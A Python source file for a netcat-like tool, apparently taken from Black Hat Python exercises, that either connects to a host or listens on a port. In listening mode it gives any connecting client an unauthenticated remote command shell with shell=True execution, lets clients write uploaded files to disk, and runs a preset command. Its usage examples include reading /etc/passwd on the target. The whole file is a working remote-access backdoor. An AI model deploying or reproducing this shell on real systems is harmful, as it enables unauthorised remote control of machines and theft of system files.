import sys
import shlex
import socket
import textwrap
import argparse
import threading
import subprocess

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    else:
        try:
            result = subprocess.run(shlex.split(cmd), capture_output=True, text=True, shell=True)
            output = result.stdout
            error = result.stderr
            if output: return output
            else: return  error
        except Exception as e:
            return  e
class NetCap:
    def __init__(self, argument, bufferCommand=None):
        self.args = argument
        self.buffer = bufferCommand
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buff = input('> ')
                    buff += '\n'
                    self.socket.send(buff.encode())
        except KeyboardInterrupt:
            print("User terminated")
            self.socket.close()
            sys.exit()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)

        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    def handle(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: # > ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'Server killed {e}')
                    self.socket.close()
                    sys.exit()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description = "IMBZ Tool",
        formatter_class = argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''
        Example:
            netcap.py -t 192.168.1.108 -p 5555 -l -c # command shell
            netcap.py -t 192.168.1.108 -p 5555 -l -u=uploaded.txt # upload to file
            netcap.py -t 192.168.1.108 -p 5555 -l -e=\\"cat /etc/passwd \\" # execute command
            echo 'ABC' | ./netcpa.py -t 192.168.1.108 -p 1335 # echo text to server port 135
            netcap.py -t 192.168.1.108 -p 5555 # connect to server
        ''')
    )
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specifief command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCap(args, buffer.encode())
    nc.run()
